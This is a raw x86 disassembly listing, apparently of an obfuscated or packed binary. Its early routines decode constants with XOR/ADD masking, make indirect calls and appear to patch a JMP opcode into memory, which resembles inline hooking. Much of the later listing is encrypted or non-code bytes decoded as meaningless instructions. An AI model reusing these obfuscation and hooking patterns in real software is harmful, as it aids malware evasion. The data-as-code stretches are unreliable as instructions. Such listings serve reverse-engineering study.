  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x430656,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42ef30,0x430652
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ef10,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x4305a2,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x43064e,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x4305b2,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x4305b6,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0xb4ddf505,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a25a
  40a236:	das    
  40a237:	mov    ebp,0xccb0270
  40a23c:	sbb    BYTE PTR [ebp+edi*2+0x33],0x0
  40a241:	jp     0x40a1f0
  40a243:	popa   
  40a244:	jge    0x40a270
  40a246:	scas   al,BYTE PTR es:[edi]
  40a247:	add    eax,0x5dbacc19
  40a24c:	xchg   edx,eax
  40a24d:	xchg   esi,eax
  40a24e:	mov    cl,0x13
  40a250:	push   ss
  40a251:	dec    esp
  40a252:	push   ecx
  40a253:	push   edi
  40a254:	cld    
  40a255:	cmp    al,0x65
  40a257:	lea    edx,[esi]
  40a259:	iret   
  40a25a:	nop
  40a25b:	jbe    0x40a261
  40a25d:	pop    edi
  40a25e:	mov    ds:0xe199c6eb,eax
  40a263:	and    BYTE PTR [ebx],ch
  40a265:	and    ah,BYTE PTR [edx+0x57]
  40a268:	jo     0x40a2e1
  40a26a:	(bad)  
  40a26b:	push   esp
  40a26c:	test   bl,al
  40a26e:	ss out 0xb7,al
  40a271:	mov    eax,ds:0x1e262d5b
  40a276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a277:	int3   
  40a278:	mov    ch,0xd0
  40a27a:	push   ss
  40a27b:	push   0x37
  40a27d:	mov    eax,ds:0x665fdbd1
  40a282:	out    dx,al
  40a283:	js     0x40a2a5
  40a285:	mov    al,0x86
  40a287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a288:	ss pop eax
  40a28a:	test   BYTE PTR [edi],ch
  40a28c:	lods   al,BYTE PTR ds:[esi]
  40a28d:	mov    WORD PTR [ebp+0x1c65fd8c],ss
  40a293:	(bad)  
  40a294:	push   ss
  40a295:	subps  xmm4,xmm0
  40a298:	inc    ecx
  40a299:	pop    eax
  40a29a:	cmp    ebx,DWORD PTR [ebx+0x7f]
  40a29d:	out    0xf0,eax
  40a29f:	aas    
  40a2a0:	cmp    cl,ah
  40a2a2:	fwait
  40a2a3:	shr    dl,0x98
  40a2a6:	inc    eax
  40a2a7:	ins    DWORD PTR es:[edi],dx
  40a2a8:	adc    al,0x6d
  40a2aa:	cmc    
  40a2ab:	push   ebp
  40a2ac:	fcom   DWORD PTR [eax-0x54e5d3f2]
  40a2b2:	or     cl,bh
  40a2b4:	call   0x766b:0x9c5c5884
  40a2bb:	sbb    al,0x49
  40a2bd:	xor    al,0x45
  40a2bf:	lea    edx,[ebx]
  40a2c1:	sbb    esp,DWORD PTR [edi+0x7c211412]
  40a2c7:	ins    BYTE PTR es:[edi],dx
  40a2c8:	pop    ss
  40a2c9:	cld    
  40a2ca:	mov    BYTE PTR [ebx+0x21574264],bl
  40a2d0:	repnz call 0xacb3:0xae71a474
  40a2d8:	pop    es
  40a2d9:	daa    
  40a2da:	cmp    eax,0x38fd940b
  40a2df:	cwde   
  40a2e0:	inc    edx
  40a2e1:	adc    ah,0xf5
  40a2e4:	pop    edi
  40a2e5:	jno    0x40a2d5
  40a2e7:	push   ebp
  40a2e8:	mov    WORD PTR [ebp+0x11],ds
  40a2eb:	push   0x151cbf83
  40a2f0:	lea    ecx,[ecx]
  40a2f2:	fld    QWORD PTR [edx]
  40a2f4:	rcl    DWORD PTR [esi+0x7f0d98fc],1
  40a2fa:	clc    
  40a2fb:	mov    di,WORD PTR [eax]
  40a2fe:	and    ah,BYTE PTR [eax+0x4ab8fd8f]
  40a304:	lods   eax,DWORD PTR ds:[esi]
  40a305:	into   
  40a306:	call   0xd9dc97d3
  40a30b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a30c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a30d:	xor    eax,0xfe48baf
  40a312:	in     eax,0x75
  40a314:	and    dl,BYTE PTR ds:0x74cfcc6
  40a31a:	inc    ebp
  40a31b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a31c:	js     0x40a314
  40a31e:	fstp   QWORD PTR [edx+0x634248f1]
  40a324:	(bad)
  40a329:	mov    ?,WORD PTR [edi]
  40a32b:	clc    
  40a32c:	adc    al,0x42
  40a32e:	dec    edi
  40a32f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a330:	imul   ecx,ecx,0x125c496c
  40a336:	inc    esp
  40a337:	or     esi,DWORD PTR [edx+0x77f0f655]
  40a33d:	fild   WORD PTR [ebx-0x4d]
  40a340:	loopne 0x40a30d
  40a342:	(bad)  
  40a343:	xor    eax,0x1147fb33
  40a348:	xchg   ebp,eax
  40a349:	adc    DWORD PTR [ecx+0x574b587a],eax
  40a34f:	pop    ds
  40a350:	xchg   BYTE PTR [esi+0x39],bl
  40a353:	pop    eax
  40a354:	lahf   
  40a355:	xor    DWORD PTR [ebx],ebp
  40a357:	(bad)  
  40a358:	sub    dl,bh
  40a35a:	dec    esp
  40a35b:	inc    ebp
  40a35c:	or     esp,DWORD PTR [eax+0x212ab9fa]
  40a362:	ins    BYTE PTR es:[edi],dx
  40a363:	xchg   edx,eax
  40a364:	mov    eax,0x9150ed37
  40a369:	inc    eax
  40a36a:	or     DWORD PTR [edx+0x2c],eax
  40a36d:	mov    edx,0xbf4a6918
  40a372:	test   DWORD PTR [ebx-0x1eab30b5],eax
  40a378:	jae    0x40a320
  40a37a:	dec    ecx
  40a37b:	sahf   
  40a37c:	out    dx,eax
  40a37d:	ja     0x40a308
  40a37f:	loop   0x40a399
  40a381:	es mov ecx,0x829ffdb0
  40a387:	mov    dl,0x7a
  40a389:	ja     0x40a38f
  40a38b:	fcom   QWORD PTR [edi]
  40a38d:	sub    eax,DWORD PTR [eax+0x25acd953]
  40a393:	xchg   BYTE PTR [edi+0x38430d92],dl
  40a399:	jae    0x40a40f
  40a39b:	ffree  st(4)
  40a39d:	scas   al,BYTE PTR es:[edi]
  40a39e:	rcr    DWORD PTR [ecx+0x7f],1
  40a3a1:	jns    0x40a364
  40a3a3:	cmp    eax,0xb8936bda
  40a3a8:	mov    dl,0xd7
  40a3aa:	inc    esi
  40a3ab:	pop    edi
  40a3ac:	aad    0x93
  40a3ae:	repz cdq 
  40a3b0:	sbb    esi,eax
  40a3b2:	or     eax,DWORD PTR [ecx+eax*1+0x7]
  40a3b6:	mov    ebx,0xd32c01d5
  40a3bb:	cmp    ch,BYTE PTR [ebp+eax*1-0x23e1025d]
  40a3c2:	fimul  DWORD PTR [eax-0xb]
  40a3c5:	addr16 push es
  40a3c7:	dec    ebp
  40a3c8:	or     DWORD PTR [eax-0x58],esi
  40a3cb:	ss xchg ebx,eax
  40a3cd:	jg     0x40a417
  40a3cf:	test   al,0x6c
  40a3d1:	sti    
  40a3d2:	in     eax,dx
  40a3d3:	jne    0x40a42f
  40a3d5:	push   esp
  40a3d6:	test   DWORD PTR [ebp+0x68de1fec],edx
  40a3dc:	mov    dl,0xc5
  40a3de:	dec    eax
  40a3df:	pop    edx
  40a3e0:	fs std 
  40a3e2:	xor    al,0x9f
  40a3e4:	cs pop ecx
  40a3e6:	shl    BYTE PTR cs:[edx],0x53
  40a3ea:	out    0x2,al
  40a3ec:	jns    0x40a41b
  40a3ee:	fisttp QWORD PTR [ebx-0x2a86db1f]
  40a3f4:	pop    ss
  40a3f5:	lea    edx,[ecx+edx*1]
  40a3f8:	dec    ecx
  40a3f9:	repnz lods eax,DWORD PTR ds:[esi]
  40a3fb:	out    0x33,eax
  40a3fd:	sbb    bl,BYTE PTR [ecx-0x1e]
  40a400:	jne    0x40a427
  40a402:	retf   
  40a403:	shl    DWORD PTR [edx+0x21],0x68
  40a407:	test   DWORD PTR [eax],ebp
  40a409:	xor    dl,ah
  40a40b:	sub    al,BYTE PTR [ebx]
  40a40d:	add    edi,ebp
  40a40f:	jp     0x40a462
  40a411:	in     al,dx
  40a412:	imul   edx,DWORD PTR [edx-0x7c387f4b],0x3e9350ef
  40a41c:	test   BYTE PTR [edi+ecx*1],0x9
  40a420:	mov    esp,0xe055dd17
  40a425:	test   DWORD PTR [ebx+0x2be5c322],esp
  40a42b:	hlt    
  40a42c:	jne    0x40a482
  40a42e:	sbb    ebp,ecx
  40a430:	mov    dl,0x55
  40a432:	inc    esp
  40a433:	xchg   edx,eax
  40a434:	cwde   
  40a435:	cwde   
  40a436:	int    0x71
  40a438:	add    DWORD PTR [esi+eax*4+0x3c99fd15],ecx
  40a43f:	daa    
  40a440:	es adc bh,dh
  40a443:	fs in  al,dx
  40a445:	dec    edi
  40a446:	(bad)  
  40a448:	popf   
  40a449:	fdiv   st(5),st
  40a44b:	dec    ebx
  40a44c:	push   esp
  40a44d:	pusha  
  40a44e:	or     BYTE PTR [ebx+0x53426502],ch
  40a454:	fistp  QWORD PTR [ebx-0x1e]
  40a457:	sub    DWORD PTR [edx+ebp*1-0x5b],ecx
  40a45b:	test   BYTE PTR [ecx],0x24
  40a45e:	push   esp
  40a45f:	stos   BYTE PTR es:[edi],al
  40a460:	inc    esi
  40a461:	jp     0x40a3eb
  40a463:	mov    al,ds:0x26404f60
  40a468:	sbb    al,0x6b
  40a46a:	mov    ch,0x5b
  40a46c:	and    DWORD PTR [edi+0x1829baea],esi
  40a472:	pushf  
  40a473:	or     bh,cl
  40a475:	ins    BYTE PTR es:[edi],dx
  40a476:	cmp    eax,0x8039e1ff
  40a47b:	mov    DWORD PTR [edi+0x3d673421],0xca635dab
  40a485:	sbb    BYTE PTR [ecx+0x18],0xd1
  40a489:	fstp   DWORD PTR [ebp+0x6c]
  40a48d:	xchg   esp,eax
  40a48e:	or     eax,0x1f27b6c6
  40a493:	cmp    BYTE PTR ds:0x8458bad,dh
  40a499:	mov    DWORD PTR ds:0x430642,0x17
  40a4a3:	cmp    DWORD PTR ds:0x430642,0x0
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x430642,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42ebe4
  40a4c6:	mov    ecx,DWORD PTR ds:0x430642
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x430642,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0xf759a360
  40a537:	pop    ebp
  40a538:	jle    0x40a4ee
  40a53a:	call   0x712023bd
  40a53f:	jle    0x40a5bf
  40a541:	push   ds
  40a542:	mov    edi,0xb42cb8c6
  40a547:	xchg   edi,eax
  40a548:	inc    esi
  40a549:	inc    ebx
  40a54a:	fwait
  40a54b:	push   esp
  40a54c:	fistp  DWORD PTR [edi]
  40a54e:	pop    edi
  40a54f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a550:	inc    eax
  40a551:	cmp    eax,0x7b88f6c4
  40a556:	push   0xb0b15538
  40a55b:	pop    ebx
  40a55c:	cmp    BYTE PTR [ebx],dl
  40a55e:	jg     0x40a4f8
  40a560:	pop    eax
  40a561:	jg     0x40a5a3
  40a563:	cmp    eax,0xe9e3d238
  40a568:	mov    ecx,0xb2625a83
  40a56d:	jecxz  0x40a52e
  40a56f:	jbe    0x40a5a2
  40a571:	hlt    
  40a572:	pop    edi
  40a573:	bnd gs ret 
  40a576:	das    
  40a577:	std    
  40a578:	push   cs
  40a579:	jg     0x40a506
  40a57b:	sbb    esi,edi
  40a57d:	and    esi,DWORD PTR [edi]
  40a57f:	dec    edi
  40a580:	lock pop edx
  40a582:	mov    ebx,0xed609638
  40a587:	inc    ebp
  40a588:	ret    0xcbe0
  40a58b:	and    dl,BYTE PTR [ecx-0x6ea7986c]
  40a591:	dec    ebp
  40a592:	mov    esp,0x80ef7aaf
  40a597:	shl    DWORD PTR [eax-0x19],0x40
  40a59b:	inc    edi
  40a59c:	mov    ah,0xc1
  40a59e:	retf   0x8f1b
  40a5a1:	jo     0x40a5f0
  40a5a3:	addr16 aam 0xf7
  40a5a6:	jmp    0x40a54f
  40a5a8:	push   esp
  40a5a9:	nop
  40a5aa:	int3   
  40a5ab:	ficom  DWORD PTR [ecx-0x14]
  40a5ae:	and    al,0x85
  40a5b0:	imul   ecx,DWORD PTR [edi+0x54],0xffffffbb
  40a5b4:	bnd cs jge 0x40a606
  40a5b8:	inc    ecx
  40a5b9:	push   eax
  40a5ba:	or     al,0x42
  40a5bc:	adc    BYTE PTR [ecx],al
  40a5be:	jo     0x40a607
  40a5c0:	addr16 add al,0xa4
  40a5c3:	mov    bh,0x52
  40a5c5:	inc    BYTE PTR [ecx+0x23]
  40a5c8:	dec    edi
  40a5c9:	out    0x31,al
  40a5cb:	fisttp WORD PTR [ebp+0x6cc25c85]
  40a5d1:	xor    eax,0xd268778d
  40a5d6:	jb     0x40a5f4
  40a5d8:	loop   0x40a5c3
  40a5da:	mov    ah,0x3a
  40a5dc:	and    dl,ah
  40a5de:	daa    
  40a5df:	ror    DWORD PTR [ebp+0x7],cl
  40a5e2:	pop    es
  40a5e3:	add    bh,ch
  40a5e5:	cdq    
  40a5e6:	mov    edi,0xea6df3a7
  40a5eb:	pop    ss
  40a5ec:	xchg   ebp,eax
  40a5ed:	mul    BYTE PTR [esi]
  40a5ef:	jl     0x40a633
  40a5f1:	add    al,0xb5
  40a5f3:	gs pop es
  40a5f5:	and    eax,0x1559c6ec
  40a5fa:	sub    eax,0x20366eaa
  40a5ff:	jle    0x40a5da
  40a601:	loopne 0x40a629
  40a603:	aas    
  40a604:	sub    dl,bh
  40a606:	pop    esi
  40a607:	dec    cx
  40a609:	stc    
  40a60a:	loopne 0x40a595
  40a60c:	(bad)  
  40a60d:	cmp    eax,0xa298e8cc
  40a612:	adc    edx,DWORD PTR [ebp+0xd61db0d]
  40a618:	loope  0x40a65a
  40a61a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a61b:	jmp    0x6db177ed
  40a620:	push   edi
  40a621:	pop    ecx
  40a622:	sub    al,0xd3
  40a624:	pop    ebp
  40a625:	not    bh
  40a627:	rcl    ah,0x67
  40a62a:	cli    
  40a62b:	jmp    FWORD PTR [edx+esi*8]
  40a62e:	jmp    0x984f:0xe8eacd65
  40a635:	inc    esi
  40a636:	mov    ch,0x4f
  40a638:	mov    edi,0x56814e21
  40a63d:	mov    DWORD PTR [ebx+0x1b9df50c],edx
  40a643:	mov    esp,0x43c06c31
  40a648:	loopne 0x40a61f
  40a64a:	pop    edx
  40a64b:	fdiv   QWORD PTR [edi]
  40a64d:	bound  edi,QWORD PTR [esi-0x721c10aa]
  40a653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a654:	mov    ch,BYTE PTR [ebp+0x5b76da44]
  40a65a:	push   ss
  40a65b:	xor    eax,0x6a6ee99d
  40a660:	fwait
  40a661:	arpl   ax,bx
  40a663:	and    BYTE PTR [ecx],al
  40a665:	test   DWORD PTR [ebx-0x1a183aaf],ecx
  40a66b:	adc    eax,0x988c10bb
  40a670:	psubb  mm7,QWORD PTR [edx]
  40a673:	mov    cl,0xbe
  40a675:	and    eax,0x82aaf730
  40a67a:	popf   
  40a67b:	inc    ebp
  40a67c:	pop    esp
  40a67d:	int    0x3f
  40a67f:	arpl   WORD PTR [ebx+0x41351b01],bx
  40a685:	and    bl,BYTE PTR [edx]
  40a687:	or     al,0x5d
  40a689:	xlat   BYTE PTR ds:[ebx]
  40a68a:	loope  0x40a62a
  40a68c:	stos   DWORD PTR es:[edi],eax
  40a68d:	lds    esi,FWORD PTR [ebx-0x1e90341d]
  40a693:	push   esi
  40a694:	sbb    DWORD PTR [esi],edi
  40a696:	push   edi
  40a697:	pop    edx
  40a698:	and    al,0x4c
  40a69a:	push   eax
  40a69b:	test   eax,0xb698a85
  40a6a0:	je     0x40a660
  40a6a2:	inc    edi
  40a6a3:	loope  0x40a646
  40a6a5:	stos   BYTE PTR es:[edi],al
  40a6a6:	mov    cl,0x4b
  40a6a8:	jge    0x40a70c
  40a6aa:	je     0x40a64e
  40a6ac:	mov    esi,esp
  40a6ae:	inc    ebx
  40a6af:	push   esp
  40a6b0:	inc    ebp
  40a6b1:	xor    bl,bl
  40a6b3:	jle    0x40a64b
  40a6b5:	jle    0x40a667
  40a6b7:	mov    al,ds:0xb500d287
  40a6bc:	cmp    BYTE PTR [ebx-0x3e],ah
  40a6bf:	aaa    
  40a6c0:	test   DWORD PTR [edi],esp
  40a6c2:	sar    BYTE PTR [ecx-0x7],0x91
  40a6c6:	inc    eax
  40a6c7:	sbb    DWORD PTR [ebx-0x40],edi
  40a6ca:	pop    edx
  40a6cb:	or     dh,BYTE PTR [esi+esi*8]
  40a6ce:	jge    0x40a6d0
  40a6d0:	mov    BYTE PTR [edi],bl
  40a6d2:	cmp    ebp,DWORD PTR [edi+0x7e8e7907]
  40a6d8:	pop    eax
  40a6d9:	sbb    al,0x6d
  40a6db:	(bad)  
  40a6dc:	xchg   esi,eax
  40a6dd:	mov    DWORD PTR [ebx],ebp
  40a6df:	jbe    0x40a669
  40a6e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6e2:	mov    ecx,0x282c2813
  40a6e7:	adc    al,0x52
  40a6e9:	mov    WORD PTR [esp+esi*8-0x5c25550],ds
  40a6f0:	das    
  40a6f1:	pop    edx
  40a6f2:	fs and al,0x2f
  40a6f5:	pop    ds
  40a6f6:	sti    
  40a6f7:	inc    eax
  40a6f8:	adc    al,0xa1
